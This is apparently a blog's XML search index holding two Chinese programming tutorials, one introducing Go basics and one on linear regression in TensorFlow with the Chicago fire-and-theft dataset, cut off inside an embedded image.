<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[a-byte-of-go]]></title>
      <url>http://xinqiu.me/2017/05/09/a-byte-of-go/</url>
      <content type="html"><![CDATA[<h2 id="u7B80_u660E_Go__u6559_u7A0B"><a href="#u7B80_u660E_Go__u6559_u7A0B" class="headerlink" title="简明 Go 教程"></a>简明 Go 教程</h2><h3 id="u5B89_u88C5_u4EE5_u53CA_u8FD0_u884C"><a href="#u5B89_u88C5_u4EE5_u53CA_u8FD0_u884C" class="headerlink" title="安装以及运行"></a>安装以及运行</h3><p>关于如何安装 Go ，官网的教程已经非常详细。如果困惑于 GOPATH 的设置，可以使用 JetBrains 家的 Gogland。 只需要将 GOPATH 放在想放的目录，然后在 Gogland 选择上全局 GOPATH 路径即可，剩下的就不去烦心了，同时 Project 可以放在任何地方，而不是考虑 Project 需要放在 src 下面。在 Gogland 中有常见的两种运行方式，一种是直接使用来 <code>go run</code> 来直接运行 <code>.go</code>文件，还有一种是先 build 然后再 run。</p>
<p>这里有必要提一下 Build 这种方式的运行。正如 Gogland 的 <code>Run/Debug Configurations</code> 中所提到的，Build 会把程序作为一个 Application 来对待，build 命令只生成可执行的文件。</p>
<p>和 C 的思想有点像，如果要生成可执行程序，必须建一个 main 的 package，同时这个 package 中必须包含一个 main()。另外同一个路径下只能存在一个 package 。</p>
<p>所以一个最基础的 hello world 是这个样子的</p>
<pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token string">"fmt"</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"hello, world\n"</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre>
<h3 id="u57FA_u7840_u8BED_u6CD5"><a href="#u57FA_u7840_u8BED_u6CD5" class="headerlink" title="基础语法"></a>基础语法</h3><h4 id="u57FA_u672C_u7C7B_u578B"><a href="#u57FA_u672C_u7C7B_u578B" class="headerlink" title="基本类型"></a>基本类型</h4><p>Go 的基本类型有 </p>
<pre class=" language-go"><code class="language-go"><span class="token builtin">bool</span>

<span class="token builtin">string</span>

<span class="token builtin">int</span>  <span class="token builtin">int8</span>  <span class="token builtin">int16</span>  <span class="token builtin">int32</span>  <span class="token builtin">int64</span>
<span class="token builtin">uint</span> <span class="token builtin">uint8</span> <span class="token builtin">uint16</span> <span class="token builtin">uint32</span> <span class="token builtin">uint64</span> <span class="token builtin">uintptr</span>

<span class="token builtin">byte</span> <span class="token comment" spellcheck="true">// uint8 的别名</span>

<span class="token builtin">rune</span> <span class="token comment" spellcheck="true">// int32 的别名</span>
     <span class="token comment" spellcheck="true">// 代表一个Unicode码</span>

<span class="token builtin">float32</span> <span class="token builtin">float64</span>

<span class="token builtin">complex64</span> <span class="token builtin">complex128</span>
</code></pre>
<p>和 C 语言不同， Go 的在不同类型之间的变量赋值时需要显式转型。</p>
<h4 id="u53D8_u91CF"><a href="#u53D8_u91CF" class="headerlink" title="变量"></a>变量</h4><p>Go 定义变量类似 JS 使用 <code>var</code> 关键词，但是在变量名之后需要添上变量类型，在一行中定义多个变量时，最后的类型可代表这多个变量都是这种类型。在定义变量的同时，也可以初始化变量。</p>
<pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> i <span class="token builtin">int</span>
<span class="token keyword">var</span> c<span class="token punctuation">,</span> python<span class="token punctuation">,</span> java <span class="token builtin">bool</span>  <span class="token comment" spellcheck="true">// 这三个变量都是 bool 类型</span>
<span class="token keyword">var</span> i<span class="token punctuation">,</span> j <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span>  <span class="token comment" spellcheck="true">// 初始化 i 为 1, j 为 2</span>
</code></pre>
<p>在明确的变量类型赋值时，可以使用 <code>:=</code> 进行简写，Go 会自动推导出变量的类型。 比如 <code>k := 3</code> 就等价于 <code>var k int = 3</code>。</p>
<p>定义变量但没初始化时，变量会默认为 <strong>零值</strong>。</p>
<h4 id="u5E38_u91CF"><a href="#u5E38_u91CF" class="headerlink" title="常量"></a>常量</h4><p>常量的定义与变量类似，只不过使用 const 关键字。常量可以是字符、字符串、布尔或数字类型的值。常量不能使用 <code>:=</code> 语法定义。一个未指定类型的常量由上下文来决定其类型。</p>
<h4 id="u51FD_u6570"><a href="#u51FD_u6570" class="headerlink" title="函数"></a>函数</h4><p>使用 <code>func</code> 关键词来定义函数，这里要注意的是，和 C 不同，参数是先写参数名，再写参数类型。在这之后跟上返回值类型。比如接受两个 int 类型的参数的 <code>add</code> 函数，</p>
<pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">add</span><span class="token punctuation">(</span>x <span class="token builtin">int</span><span class="token punctuation">,</span> y <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">int</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> x <span class="token operator">+</span> y
<span class="token punctuation">}</span>
</code></pre>
<p>参数也可以被缩写成 <code>add(x, y int)</code>。</p>
<p>Go 和 Python 类似，支持返回多个值，所以在写返回值类型时，用括号将多个返回值的类型括起来即可。</p>
<p>Go 的返回值可以被命名，这样提高了代码的可读性，在规定返回值类型的地方填上要返回的变量，这样函数体中只需要些上 <code>return</code> 而不需要在最后一行写上需要返回的变量名。</p>
<h4 id="u5305"><a href="#u5305" class="headerlink" title="包"></a>包</h4><p>Go 的核心是包，每个 Go 程序都是由包组成的。程序运行的入口是包 <code>main</code>。导入包的形式有两种，一种是</p>
<pre class=" language-go"><code class="language-go"><span class="token keyword">import</span> <span class="token string">"fmt"</span>
<span class="token keyword">import</span> <span class="token string">"math"</span>
</code></pre>
<p>还有一种是</p>
<pre class=" language-go"><code class="language-go"><span class="token keyword">import</span> <span class="token punctuation">(</span>
    <span class="token string">"fmt"</span>
    <span class="token string">"math"</span>
<span class="token punctuation">)</span>
</code></pre>
<p>在 Go 中，首字母大写的名称是被导出的。因此可以通过 <code>math.Pi</code> 来调用 <code>math</code> 包中的 <code>Pi</code> 常量。</p>
<h4 id="for"><a href="#for" class="headerlink" title="for"></a>for</h4><p>for 循环和 C 很像，只是没有了括号，但循环体是一定要加上 <code>{}</code> 的。</p>
<h4 id="u53C2_u8003"><a href="#u53C2_u8003" class="headerlink" title="参考"></a>参考</h4><ol>
<li><a href="http://studygolang.com/articles/5831" target="_blank" rel="external">golang之package</a></li>
</ol>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Tensorflow for Deep Learning 3]]></title>
      <url>http://xinqiu.me/2017/03/06/cs20si-3/</url>
      <content type="html"><![CDATA[<blockquote>
<p>笔记3: 用 TensorFlow 实现线性回归和逻辑回归</p>
</blockquote>
<h3 id="TensorFlow__u7EBF_u6027_u56DE_u5F52"><a href="#TensorFlow__u7EBF_u6027_u56DE_u5F52" class="headerlink" title="TensorFlow 线性回归"></a>TensorFlow 线性回归</h3><p>这里介绍了一个简单的线性分类例子。</p>
<p>问：是否社区中的火灾数量与小偷存在一定的关系？换句话说，是否火灾数 X 与小偷数 Y 之前，存在 Y = f(X)?</p>
<p>这里使用 the U.S. Commission on Civil Rights 收集的数据集来分析。</p>
<p>数据集描述：</p>
<p>Name: 芝加哥火灾与小偷</p>
<p>X = 每1000个住宅单元的火灾数</p>
<p>Y = 每1000个人口中的小偷数</p>
<p>数据来源于芝加哥的不同区域，总计 42 个地区</p>
<p>答：</p>
<p>首先假设火灾数与小偷数是线性关系： Y = wX + b</p>
<p>使用均方误差作为损失函数(Loss Function)</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt
<span class="token keyword">import</span> tensorflow <span class="token keyword">as</span> tf
<span class="token keyword">import</span> xlrd

DATA_FILE <span class="token operator">=</span> <span class="token string">'data/fire_theft.xls'</span>

<span class="token comment" spellcheck="true"># Step 1: read in data from the .xls file</span>
<span class="token comment" spellcheck="true"># book = xlrd.open_workbook(DATA_FILE, encoding_override="utf-8")</span>
<span class="token comment" spellcheck="true"># sheet = book.sheet_by_index(0)</span>
<span class="token comment" spellcheck="true"># data = np.asarray([sheet.row_values(i) for i in range(1, sheet.nrows)])</span>
<span class="token comment" spellcheck="true"># n_samples = sheet.nrows - 1</span>
<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd  <span class="token comment" spellcheck="true"># 使用pandas更简便</span>
df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_excel<span class="token punctuation">(</span>DATA_FILE<span class="token punctuation">)</span>
data <span class="token operator">=</span> df<span class="token punctuation">.</span>values
n_samples <span class="token operator">=</span> len<span class="token punctuation">(</span>df<span class="token punctuation">.</span>index<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Step 2: create placeholders for input X (number of fire) and label Y (number of theft)</span>
X <span class="token operator">=</span> tf<span class="token punctuation">.</span>placeholder<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>float32<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'X'</span><span class="token punctuation">)</span>
Y <span class="token operator">=</span> tf<span class="token punctuation">.</span>placeholder<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>float32<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Y'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Step 3: create weight and bias, initialized to 0</span>
w <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'weights'</span><span class="token punctuation">)</span>
b <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'bias'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Step 4: build model to predict Y</span>
Y_predicted <span class="token operator">=</span> X <span class="token operator">*</span> w <span class="token operator">+</span> b 

<span class="token comment" spellcheck="true"># Step 5: use the square error as the loss function</span>
loss <span class="token operator">=</span> tf<span class="token punctuation">.</span>square<span class="token punctuation">(</span>Y <span class="token operator">-</span> Y_predicted<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'loss'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Step 6: using gradient descent with learning rate of 0.01 to minimize loss</span>
optimizer <span class="token operator">=</span> tf<span class="token punctuation">.</span>train<span class="token punctuation">.</span>GradientDescentOptimizer<span class="token punctuation">(</span>learning_rate<span class="token operator">=</span><span class="token number">0.001</span><span class="token punctuation">)</span><span class="token punctuation">.</span>minimize<span class="token punctuation">(</span>loss<span class="token punctuation">)</span>

<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># Step 7: initialize the necessary variables, in this case, w and b</span>
    sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>global_variables_initializer<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
    writer <span class="token operator">=</span> tf<span class="token punctuation">.</span>summary<span class="token punctuation">.</span>FileWriter<span class="token punctuation">(</span><span class="token string">'./my_graph/03/linear_reg'</span><span class="token punctuation">,</span> sess<span class="token punctuation">.</span>graph<span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># Step 8: train the model</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># train the model 100 times</span>
        total_loss <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">for</span> x<span class="token punctuation">,</span> y <span class="token keyword">in</span> data<span class="token punctuation">:</span>
            <span class="token comment" spellcheck="true"># Session runs train_op and fetch values of loss</span>
            _<span class="token punctuation">,</span> l <span class="token operator">=</span> sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span>optimizer<span class="token punctuation">,</span> loss<span class="token punctuation">]</span><span class="token punctuation">,</span> feed_dict<span class="token operator">=</span><span class="token punctuation">{</span>X<span class="token punctuation">:</span> x<span class="token punctuation">,</span> Y<span class="token punctuation">:</span>y<span class="token punctuation">}</span><span class="token punctuation">)</span>
            total_loss <span class="token operator">+=</span> l

        <span class="token keyword">print</span> <span class="token string">'Epoch {0}: {1}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span> total_loss<span class="token operator">/</span>n_samples<span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># close the writer when you're done using it</span>
    writer<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span> 

    <span class="token comment" spellcheck="true"># Step 9: output the values of w and b</span>
    w_value<span class="token punctuation">,</span> b_value <span class="token operator">=</span> sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span>w<span class="token punctuation">,</span> b<span class="token punctuation">]</span><span class="token punctuation">)</span> 

<span class="token comment" spellcheck="true"># plot the results</span>
X<span class="token punctuation">,</span> Y <span class="token operator">=</span> data<span class="token punctuation">.</span>T<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span>T<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span> Y<span class="token punctuation">,</span> <span class="token string">'bo'</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'Real data'</span><span class="token punctuation">)</span>
plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span> X <span class="token operator">*</span> w_value <span class="token operator">+</span> b_value<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'Predicted data'</span><span class="token punctuation">)</span>
plt<span class="token punctuation">.</span>legend<span class="token punctuation">(</span><span class="token punctuation">)</span>
plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p><img src="data:image/png;base64,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TzvtNO/WrZuXlJSUb3v++efdzDw/Pz+mbOVzf/nll37yySf7sGHDYra3bdvWr7rqqirnilf3NWvWuJn5448/XmM9G4voz/WePXv8+utv9e7dh3q3bhd59+5D/bLLrnHAgb7ewN9jNU+IiERZtGgl4fCIuPvC4ZEsXLgyK49dxt0ZOnQonTp14phjjuHSSy+lbdu2LFy4kKOOOqq83PLly9m9ezeXX34527dvL3+YGf379+fFF18sL3vooYeW//uLL75g+/bt9O/fH3enuLi4TvXbsmULf//73xk7dixt27Yt3z506FBOPPHEKuWjz71r1y527tzJ2WefnfB5o1//5ZdfsmPHDo477jg6dOhQ57pnu7179zJgwBjmzBnAxo3L2bRpARs3LucvfzklaedQ84SISIS7U1rahqDZIB6jtDS3XmnfVB475ihmPPjgg/Ts2ZPdu3fzhz/8gVdeeaXKqIl//etfuDvnnHNO3GO0b9++/PnOnTuZOnUq//mf/8knn3wSU2737t11ql9ZX4IePXpU2derVy/eeOONmG3PPPMM06dP58033+SLL74o3x4KJXbPu3//fu68807mzp3Lpk2byrLX9ap7tpsz57FI09fIqK2G+78l7RwKGkREIsyMnJy9BJnceD/cTk7O3nr9qKfy2JWdccYZ5aMnRo8ezVlnncUVV1zB+vXryc3NBSAcDmNmPP7443Tp0qXKMVq2rPh5uPTSS1m9ejU//elPOfXUU2nbti3hcJgRI0YQDocbXN/qvPrqq4wePZrBgwfz0EMPceSRR5KTk8Mf/vAHCgsLEzrGhAkTmDdvHpMmTeLrX/867du3x8y47LLLUlr3THjllTcJhx9O6TkUNIiIRBk1aiBz5iytdLcWCIWWcNFFZ2XlsasTCoW46667OOecc3jggQf46U9/CgQdBd2dTp06MWTIkGpfv2vXLlasWMG0adO45ZZbyre/99579arPV77yFSDIdFS2fv36mOdPPfUUrVu3ZunSpTFBzO9///sqr60u2Jo/fz5jx47lnnvuKd/2xRdfsGvXrnrVP5t9+WVrqs9kJYf6NIiIRJk+/SZ6976PUGgxQVYAwAmFFtO790zuuOPHWXnsmnzjG9/gzDPPZNasWRw4cACAESNG0K5dO+68806+/PLLKq/Ztm0bAC1atACoclc+c+bMemVFunbtymmn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